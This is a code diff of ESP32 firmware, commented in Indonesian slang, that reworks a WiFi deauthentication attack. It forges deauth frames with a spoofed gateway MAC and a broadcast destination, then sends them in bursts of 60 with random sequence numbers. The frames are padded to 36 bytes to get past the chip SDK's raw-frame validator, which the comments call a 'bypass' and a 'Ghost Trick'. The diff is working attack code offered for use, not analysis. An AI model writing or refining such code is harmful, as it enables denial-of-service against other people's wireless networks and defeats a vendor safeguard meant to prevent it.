@@ -124,24 +124,15 @@ void loopWiFi(void * pvParameters) {
 
     // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
     // Pindahin ke luar biar mandiri Cok!
-            else if (isDeauthing && adaTarget) {
+                else if (isDeauthing && adaTarget) {
       if (!deauthUdahSetup) {
         esp_wifi_stop();
-        delay(5);
-        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-        esp_wifi_init(&cfg);
-        esp_wifi_set_mode(WIFI_MODE_APSTA);
-        esp_wifi_start(); // NYALAIN RADIONYA! Tanpa ini, interface statusnya INVALID
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-        
-        wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
-        esp_wifi_set_promiscuous_filter(&filter);
+        esp_wifi_set_mode(WIFI_MODE_APSTA); 
+        esp_wifi_start();
+        esp_wifi_set_ps(WIFI_PS_NONE); 
+        // Ghost Trick: Aktifin CSI biar hardware validator 'longgar'
         esp_wifi_set_promiscuous(true);
-        
         esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
-        esp_wifi_set_max_tx_power(78); 
-        esp_wifi_set_ps(WIFI_PS_NONE); // Tetap pake ini biar radio gak tidur
-        
         deauthUdahSetup = true;
       }
 
@@ -149,25 +140,27 @@ void loopWiFi(void * pvParameters) {
       stringToMac(targetTerkunci.mac, gatewayMAC); 
       uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-      uint8_t pkt[26];
-      uint8_t reason_codes[] = {0x01, 0x04, 0x06, 0x07, 0x08};
-      static int r_idx = 0;
-      r_idx = (r_idx + 1) % 5;
+      // Ghost Padding: S3 v5.5.1 benci paket 26 byte. Kita kasih 36 byte!
+      uint8_t ghostPkt[36]; 
+      memset(ghostPkt, 0, 36);
+      memcpy(ghostPkt, deauthFrame, 26); // Isi data deauth standar
 
-      // Build & Send Deauth
-      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, 0x01, false);
-      
-      // PAKSA PAKAI TRUE! Biar hardware yang urus sequence-nya
-      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, true);  // <--- PAKE FALSE SESUAI BRUCE
+      for (int b = 0; b < 60; b++) {
+        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
+        ghostPkt[0] = 0xc0; 
+        memcpy(&ghostPkt[4],  broadcast, 6);
+        memcpy(&ghostPkt[10], gatewayMAC, 6);
+        memcpy(&ghostPkt[16], gatewayMAC, 6);
+        ghostPkt[22] = seq & 0xFF;
+        ghostPkt[23] = (seq >> 8) & 0xFF;
 
-      // Build & Send Disassoc
-      buildOptimizedDeauthFrame(pkt, broadcast, gatewayMAC, gatewayMAC, 0x01, true);
-      
-      // PAKSA PAKAI TRUE! Biar hardware yang urus sequence-nya
-      esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, true);  // <--- PAKE FALSE SESUAI BRUCE
-
-      delay(5); // Kasih napas dikit
+        // Tembak pake WIFI_IF_AP sesuai gaya GhostESP di SDK 5.5.1
+        esp_wifi_80211_tx(WIFI_IF_AP, ghostPkt, 36, true); 
+        delayMicroseconds(100);
+      }
+      vTaskDelay(1 / portTICK_PERIOD_MS);
     }
+
 
    
 
